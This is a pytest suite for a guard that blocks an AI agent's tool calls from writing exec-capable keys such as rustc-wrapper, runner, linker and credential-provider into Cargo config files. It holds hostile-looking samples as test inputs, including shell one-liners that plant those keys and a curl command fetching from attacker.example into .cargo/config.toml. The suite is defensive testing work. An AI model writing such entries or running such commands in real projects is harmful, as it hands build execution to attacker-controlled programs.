"""Cargo config exec-hijack protection guard — blocks writing an exec-capable
key (`rustc-wrapper`, `rustc-workspace-wrapper`, `rustc`, `rustdoc`,
`linker`, `runner`, `credential-provider`, `-fuse-ld=`) into
`.cargo/config.toml` / `.cargo/config`, which Cargo itself execs on the next
build/test/run/publish. Default mode `ask`, human-escapable only.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"
EVIL = '[build]\nrustc-wrapper = "/tmp/x.sh"\n'


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _gated(d):
    return d.action in (Action.ASK, Action.DENY)


@pytest.fixture(autouse=True)
def _no_env(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CARGO_EXEC", raising=False)


@pytest.mark.parametrize("body", [
    '[build]\nrustc-wrapper = "/tmp/x"\n',
    '[build]\nrustc-workspace-wrapper = "sccache-evil"\n',
    '[build]\nrustc = "/tmp/rustc"\n',
    '[build]\nrustdoc = "/tmp/rd"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/ld"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/run"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = ["/tmp/run", "--x"]\n',
    '[registry]\ncredential-provider = ["/tmp/p"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/p"]\n',
    'target.x86_64-unknown-linux-gnu.runner = "/tmp/run"\n',
    '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/ld"]\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/ld"]\n',
    '[build]\n"rustc-wrapper" = "/tmp/x"\n',
    '[build]\nRUSTC-WRAPPER="/tmp/x"\n',
])
def test_write_gated(body):
    for path in (".cargo/config.toml", ".cargo/config", "/home/u/.cargo/config.toml",
                 "proj/.cargo/config.toml", ".cargo\\config.toml"):
        d = evaluate(_write(path, body), EMPTY)
        assert _gated(d) and d.rule == RULE, (path, body)


def test_multiedit_and_edit_gated():
    e = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                   args={"file_path": ".cargo/config.toml",
                         "edits": [{"old_string": "x", "new_string": EVIL}]})
    assert evaluate(e, EMPTY).rule == RULE
    e = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                   args={"file_path": ".cargo/config.toml", "new_string": EVIL})
    assert evaluate(e, EMPTY).rule == RULE


def test_mcp_write_gated():
    e = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                   args={"path": "/r/.cargo/config.toml", "content": EVIL})
    assert evaluate(e, EMPTY).rule == RULE


def test_deny_mode():
    d = evaluate(_write(".cargo/config.toml", EVIL), DENY)
    assert d.action == Action.DENY and d.rule == RULE


@pytest.mark.parametrize("cmd", [
    "printf '[build]\\nrustc-wrapper=\"/tmp/x\"\\n' > .cargo/config.toml",
    "echo 'runner = \"/tmp/x\"' >> ~/.cargo/config.toml",
    "cat > .cargo/config <<'EOF'\n[target.x]\nlinker = \"/tmp/l\"\nEOF",
    "cd .cargo && echo 'rustc-wrapper = \"/tmp/x\"' > config.toml",
    "tee .cargo/config.toml <<< 'credential-provider = [\"/tmp/p\"]'",
])
def test_shell_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d), cmd


def test_shell_escape_human_only():
    cmd = "echo 'runner = \"/tmp/x\"' >> .cargo/config.toml  # aegis-allow"
    assert not _gated(evaluate(_shell(cmd), EMPTY)) or evaluate(_shell(cmd), EMPTY).rule != RULE


def test_env_toggle_allows(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(_write(".cargo/config.toml", EVIL), EMPTY).rule != RULE


def test_policy_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"cross/\.cargo/config"]})
    assert evaluate(_write("cross/.cargo/config.toml", EVIL), pol).rule != RULE
    assert evaluate(_write(".cargo/config.toml", EVIL), pol).rule == RULE


def test_off_and_monitor():
    assert evaluate(_write(".cargo/config.toml", EVIL),
                    Policy(cargo_exec={"mode": "off"})).rule != RULE
    assert evaluate(_write(".cargo/config.toml", EVIL),
                    Policy(cargo_exec={"mode": "monitor"})).rule != RULE


@pytest.mark.parametrize("body", [
    '[alias]\nb = "build --release"\n',
    '[net]\nretry = 3\n',
    '[build]\ntarget-dir = "out"\n',
    '[env]\nFOO = "bar"\n',
    '# rustc-wrapper = "/tmp/x"  (commented out)\n',
    '# TODO: maybe set a runner = "x" later\n[build]\njobs = 4\n',
])
def test_benign_config_not_gated(body):
    assert evaluate(_write(".cargo/config.toml", body), EMPTY).rule != RULE


def test_exec_key_in_other_file_not_gated():
    assert evaluate(_write("notes.toml", EVIL), EMPTY).rule != RULE
    assert evaluate(_write("src/main.rs", 'let runner = "x";'), EMPTY).rule != RULE


def test_read_not_gated():
    e = Event.make(HookEvent.PRE_TOOL_USE, tool="Read", args={"file_path": ".cargo/config.toml"})
    assert evaluate(e, EMPTY).rule != RULE
    assert evaluate(_shell("cat .cargo/config.toml"), EMPTY).rule != RULE


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://attacker.example/x"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


def test_yaml_knob_roundtrip(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.cargo_exec == {"mode": "deny"}
    assert evaluate(_write(".cargo/config.toml", EVIL), pol).action == Action.DENY


def test_no_redos():
    import time
    big = "x = 1\n" * 200000 + "/" * 50000
    t = time.time()
    evaluate(_write(".cargo/config.toml", big), EMPTY)
    evaluate(_shell("echo " + big[:200000] + " > .cargo/config.toml"), EMPTY)
    assert time.time() - t < 5
